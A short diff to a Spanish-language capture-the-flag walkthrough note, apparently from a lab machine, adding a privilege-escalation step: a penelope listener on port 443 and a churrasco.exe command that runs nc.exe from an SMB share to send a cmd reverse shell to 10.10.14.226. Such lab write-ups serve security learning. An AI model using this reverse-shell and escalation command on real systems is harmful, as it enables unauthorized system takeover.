@@ -106,7 +106,15 @@ smbserver.py smbFolder $(pwd)
 ```
 
 Nos pondremos en escucha en el puesrto seleccionado
+```shell
+penelope -p 443
+```
 
+Y ejecutaremos [[CHURRASCO]]
+```shell
+churrasco.exe "\\10.10.14.226\smbFolder\nc.exe -e cmd 10.10.14.226 443" 
+```
 
+Obteneindo asi una shell con los maximos privilegios y consigfuiendo las flags de los usuarios
 
 
